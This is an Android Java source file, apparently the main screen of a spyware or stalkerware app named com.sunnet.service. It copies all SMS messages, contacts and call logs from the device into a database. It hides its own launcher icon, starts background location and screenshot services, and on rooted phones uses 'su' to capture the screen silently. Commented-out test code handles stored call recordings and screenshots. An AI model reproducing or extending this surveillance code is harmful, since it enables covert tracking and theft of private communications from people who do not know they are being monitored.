package com.sunnet.service;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.location.LocationManager;
import android.os.Bundle;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;

import com.scottyab.rootbeer.RootBeer;
import com.sunnet.service.application.MyApplication;
import com.sunnet.service.asynctask.ConcurrentAsyncTask;
import com.sunnet.service.db.DatabaseHelper;
import com.sunnet.service.db.config.OrmliteManager;
import com.sunnet.service.receiver.LocationStatusReceiver;
import com.sunnet.service.service.LocationService;
import com.sunnet.service.service.NewScreenShotService;
import com.sunnet.service.service.SchedulingService;
import com.sunnet.service.util.SharedPreferencesUtility;
import com.sunnet.service.util.Utils;

import java.io.IOException;
import java.io.OutputStream;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        new ConcurrentAsyncTask<Void, Void, Boolean>() {
            @Override
            protected Boolean doInBackground(Void... params) {
                OrmliteManager.initialize(MyApplication.getContext());

                //-- Init database for the first
                String versionAppInstalled = SharedPreferencesUtility.getInstance()
                        .getString(SharedPreferencesUtility.VERSION_APP_INSTALLED, "");
                try {
                    if (!versionAppInstalled.equals(MyApplication.getContext().getPackageManager()
                            .getPackageInfo(MyApplication.getContext().getPackageName(), 0).versionCode + "")) {

                        //-- Update all sms
                        DatabaseHelper.createAllSms(DatabaseHelper.getAllSmsFromDevice());

                        //-- Update all Contact
                        DatabaseHelper.createAllContact(DatabaseHelper.getAllContactFromDevice());

                        //-- Update all call log
                        DatabaseHelper.createAllCallLog(DatabaseHelper.getAllCallLog());

                    }
                } catch (PackageManager.NameNotFoundException e) {
                    e.printStackTrace();
                }

                //-- Store version of app currently
                try {
                    SharedPreferencesUtility.getInstance()
                            .putString(SharedPreferencesUtility.VERSION_APP_INSTALLED,
                                    MyApplication.getContext().getPackageManager()
                                            .getPackageInfo(MyApplication.getContext().getPackageName(), 0).versionCode + "");
                } catch (PackageManager.NameNotFoundException e) {
                    e.printStackTrace();
                }

                //-- Test insert voice into database
                /*String[] audios = {"audio1.tvh", "audio2.tvh", "audio3.tvh"};
                List<CallVoiceEntity> voiceList = new ArrayList<>();
                File root = android.os.Environment.getExternalStorageDirectory();
                String filepath = root.getAbsolutePath();
                File file = new File(filepath, CallService.FILE_DIRECTORY);
                for (int i = 0; i < audios.length; i++) {
                    CallVoiceEntity entity = new CallVoiceEntity();
                    entity.setId("" + i);
                    entity.setAudio(file.getAbsolutePath() + "/" + audios[i]);
                    entity.setPhoneNumber(ConfigApi.DEFAULT_PHONE_NUMBER);
                    entity.setPhoneName("TVH");
                    //entity.encrypt();
                    voiceList.add(entity);
                }
                DatabaseHelper.createAllVoiceCall(voiceList);*/

                //-- Test insert screenshot into database
               /* String[] imgs = {"img_1.nmt", "img_2.nmt", "img_3.nmt"};
                List<CaptureEntity> captureList = new ArrayList<>();
                File root = android.os.Environment.getExternalStorageDirectory();
                String filepath = root.getAbsolutePath();
                long timeLong = Calendar.getInstance().getTimeInMillis();
                File file = new File(filepath, ScreenShotService.FILE_DIRECTORY);
                for (int i = 0; i < imgs.length; i++) {
                    CaptureEntity entity = new CaptureEntity();
                    entity.setId("" + i);
                    entity.setPicture(file.getAbsolutePath() + "/" + imgs[i]);
                    entity.setPhone(ConfigApi.DEFAULT_PHONE_NUMBER);
                    entity.setDate(String.valueOf(timeLong++));
                    //entity.encrypt();
                    captureList.add(entity);
                }
                DatabaseHelper.createAllCapture(captureList);*/
                return true;
            }
        }.executeConcurrently();



        //

        final Button btnCheckRoot = (Button) findViewById(R.id.btn_check_root);
        final Button btnHideIcon = (Button) findViewById(R.id.btn_hide_icon);
        final Button btnSettings = (Button) findViewById(R.id.btn_settings);
        final Button btnStartServices = (Button) findViewById(R.id.btn_start_services);


        View.OnClickListener onClickListener = new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if (v == btnCheckRoot) {
                    checkRoot();
                } else if (v == btnHideIcon) {
                    removeShortcut();
                    finish();
                } else if (v == btnSettings) {
                    Intent intent = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
                    startActivity(intent);
                } else if (v == btnStartServices) {
                    IntentFilter intentFilter = new IntentFilter(LocationManager.PROVIDERS_CHANGED_ACTION);
                    registerReceiver(new LocationStatusReceiver(), intentFilter);

                    startService(new Intent(MainActivity.this, LocationService.class));
                    startService(new Intent(MainActivity.this, SchedulingService.class));
                    startService(new Intent(MainActivity.this, NewScreenShotService.class));
                }
            }
        };

        btnCheckRoot.setOnClickListener(onClickListener);
        btnHideIcon.setOnClickListener(onClickListener);
        btnSettings.setOnClickListener(onClickListener);
        btnStartServices.setOnClickListener(onClickListener);
    }

    @Override
    protected void onStart() {
        super.onStart();
        //removeShortcut();
        //finish();
    }

    private void checkRoot() {
        RootBeer rootBeer = new RootBeer(this);
        if (rootBeer.isRooted()) {
            //we found indication of root
            Utils.showAlertDialog(this, "Root Device", "This device has rooted", true, null);

            //Take 1 screenshot
            Process sh = null;
            String fileName = System.currentTimeMillis() / 1000 + ".nmt";

            try {
                sh = Runtime.getRuntime().exec("su", null, null);
                OutputStream os = sh.getOutputStream();
                os.write(("/system/bin/screencap -p " + "/sdcard/" + fileName).getBytes("ASCII"));
                os.flush();

                os.close();
                sh.waitFor();

            } catch (IOException e) {
                e.printStackTrace();
            } catch (InterruptedException e) {
                e.printStackTrace();
            }

        } else {
            //we didn't find indication of root
            Utils.showAlertDialog(this, "Root Device", "This device has not rooted", false, null);
        }
    }

    private void removeShortcut() {
        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }

    private void showShortcut() {
        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class);
        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
    }
}
